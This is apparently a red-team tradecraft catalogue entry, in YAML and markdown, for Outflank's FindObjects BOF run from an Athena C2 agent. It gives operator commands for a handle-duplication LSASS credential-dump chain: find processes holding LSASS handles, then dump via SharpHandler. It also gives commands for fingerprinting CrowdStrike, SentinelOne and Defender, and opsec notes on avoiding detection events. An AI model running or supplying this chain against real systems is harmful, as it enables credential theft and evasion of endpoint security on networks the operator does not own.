---
name: FindObjects BOF
category: recon
subcategories: [handle-scan, object-search, bof, process-handles]
tradecraft_tags: [bof, handles, objects, process-scan, lsass-alternative, athena]
mitre_attack:
  - id: T1057
    name: Process Discovery
source:
  url: https://github.com/outflanknl/FindObjects-BOF
  license: MIT
  maintained: true
binary_type: bof
binary_filename: FindObjects.x64.o
supported_os: [windows]
architecture: [x64]
privilege_required: user
network_required: false
detection_signal: |
  FindObjects-BOF scans process handles to find specific object types (mutants, events,
  sections, processes). The handle enumeration API calls are low-level and not commonly
  monitored. No child process creation; runs entirely in-process.
usage_examples:
  - description: Find all processes with an open handle to LSASS (for handle duplication)
    args: "execute-bof FindObjects.x64.o --process lsass"
  - description: Find named mutexes (useful for C2 uniqueness checks or anti-sandbox)
    args: "execute-bof FindObjects.x64.o --type mutant"
  - description: Find processes with specific module loaded (EDR fingerprinting)
    args: "execute-bof FindObjects.x64.o --module CrowdStrike"
opsec_notes: |
  FindObjects-BOF is the reconnaissance step before SharpHandler (handle duplication).
  It identifies which processes have LSASS handles open — providing the target PIDs
  for SharpHandler's handle duplication approach. Running in-process via BOF generates
  no child process or process-access events.
gotchas: |
  Apollo has no BOF runner — requires Athena. FindObjects is from Outflank's collection.
  The process handle enumeration requires appropriate privileges — a standard user can
  see most handles but some SYSTEM-owned handles may be inaccessible. Use the output
  to identify candidate PIDs for SharpHandler.
related_ttps: [sharphandler, nanodump-bof-expanded, outflank-remote-ops-bofs, trustedsec-bofs]
alternatives: [sharpedrchecker, process-list-manual]
common_args:
  --process:
    description: Find processes with handles to the specified process name
    typical_values: ["lsass", "winlogon"]
  --type:
    description: Find handles of specified object type
    typical_values: ["mutant", "event", "section", "process"]
  --module:
    description: Find processes with a specific DLL loaded
    typical_values: ["CrowdStrike", "MsMpEng", "SentinelOne"]
last_updated: 2026-05-29
---

# FindObjects BOF

Outflank's BOF for enumerating process handles and finding specific object types.
Most valuable use case: finding processes with open LSASS handles for handle duplication
(SharpHandler technique) — allows discovering the best candidate PID for stealthy
LSASS access without directly opening LSASS from the agent process.

## Handle-Duplication LSASS Dump Chain

```
Step 1: Find processes with LSASS handles:
  execute-bof FindObjects.x64.o --process lsass
  Output: [PID 1234 - MsMpEng.exe] [PID 5678 - svchost.exe] ...

Step 2: Use SharpHandler to duplicate the handle and dump:
  SharpHandler.exe dump --pid 1234
  → No direct NtOpenProcess(lsass) from agent → handle comes from MsMpEng
```

## EDR Fingerprinting

```
Find which processes have EDR DLLs loaded:
execute-bof FindObjects.x64.o --module CsAgent    # CrowdStrike
execute-bof FindObjects.x64.o --module SentinelOne
execute-bof FindObjects.x64.o --module MpClient   # Windows Defender
→ Identifies exactly which processes are monitored by EDR hooks
```

## Apollo-specific note
BOF — requires Athena. For Apollo, Seatbelt's AntiVirus check and SharpEDRChecker
provide similar EDR fingerprinting. SharpHandler can search for LSASS handles without
the BOF by walking the process list.
